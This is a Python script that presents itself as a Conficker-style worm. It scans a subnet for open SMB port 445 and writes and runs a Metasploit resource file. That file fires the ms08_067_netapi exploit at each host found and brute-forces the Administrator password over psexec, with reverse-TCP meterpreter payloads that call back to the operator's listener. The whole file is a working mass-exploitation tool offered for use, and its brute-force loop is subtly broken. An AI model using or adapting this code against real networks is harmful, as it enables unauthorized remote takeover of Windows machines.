import os
import optparse
import sys
import nmap

"""It is the Conficker Worm using ms08_067_netapi as primary exploit and SMB bruteforce
   as the secondary attack vector for the Windows SMB service vulnerability.
   
Usage:
    python conficker.py -H 192.168.1.30-50 -l 192.168.1.3 -F passwords.txt"""
    
    
def findTgts(subNet):
    # For filtering only the hosts that have a TCP port 445(SMB protocol) open
    
    nmScan =nmap.PortScanner()
    nmScan.scan(subNet, '445')
    tgtHosts =[]
    for host in nmScan.all_hosts():
        if nmScan[host].has_tcp(445):
            state =nmScan[host]['tcp'][445]['state']
            if state =='open':
                print '[+] Found Target Host: ' +host
                tgtHosts.append(host)
    return tgtHosts

def setupHandler(configFile, lhost, lport):

    'To setup a multi/handler listener on our machine using Metasploit.'
    'DisablePayloadHandler to indicate that all future hosts do not need to set up a'
    'handler since we already have one listening'
    'Lhost & lport= local host and port'
    
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set payload '+\
    'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' +str(lport) +'\n')
    configFile.write('set LHOST ' +lhost +'\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')

def confickerExploit(configFile, tgtHost, lhost, lport):
    
    'It first selects the particular exploit, ms08_067_netapi, used in the '
    'Set RHOST, LHOST and LPORT'
    'Conficker attack against the target. Finally it sends an instruction to exploit '
    'the machine under the context of a job (-j) and to not interact with the job'
    'immediately (-z).  The  script  requires  these  particular options since it '
    'will exploit several targets and therefore cannot interact with all of them simultaneously.'
    
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST ' +str(tgtHost) +'\n')
    configFile.write('set payload '+\
    'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' +str(lport) +'\n')
    configFile.write('set LHOST ' +lhost +'\n')
    configFile.write('exploit -j -z\n')

def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):

    'If the primary attack vector(ms08_067_netapi exploit) fails then'
    'it will brute force through SMB username/password combinations attempting to gain access'
    
    username ='Administrator'
    pF =open(passwdFile, 'r')
    for password in pF.readlines():
        password =password.strip('\n').strip('\r')
        configFile.write('use exploit/windows/smb/psexec\n')
        configFile.write('set SMBUser ' +str(username) +'\n')
        configFile.write('set SMBPass ' +str(password) +'\n')
        configFile.write('set RHOST ' +str(tgtHost) +'\n')
        configFile.write('set payload '+\
        'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' +str(lport) +'\n')
    configFile.write('set LHOST ' +lhost +'\n')
    configFile.write('exploit -j -z\n')

def main():
    configFile =open('meta.rc', 'w')
    
    parser =optparse.OptionParser('[-] Usage%prog '+\
    '-H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')
    
    parser.add_option('-H', dest='tgtHost', type='string', \
    help='specify the target address[es]')
    
    parser.add_option('-p', dest='lport', type='string', \
    help='specify the listen port')
    
    parser.add_option('-l', dest='lhost', type='string', \
    help='specify the listen address')
    
    parser.add_option('-F', dest='passwdFile', type='string', \
    help='password file for SMB brute force attempt')
    
    (options, args) =parser.parse_args()
    if (options.tgtHost ==None) | (options.lhost ==None):
        print parser.usage
        exit(0)
        
    lhost =options.lhost
    lport =options.lport
    if lport ==None:
        lport ='1337'
        
    passwdFile =options.passwdFile
    tgtHosts =findTgts(options.tgtHost)
    setupHandler(configFile, lhost, lport)
    
    for tgtHost in tgtHosts:
        confickerExploit(configFile, tgtHost, lhost, lport)
        if passwdFile !=None:
            smbBrute(configFile, tgtHost, passwdFile, lhost, lport)
            
    configFile.close()
    os.system('msfconsole -r meta.rc')

if __name__ =='__main__':
    main()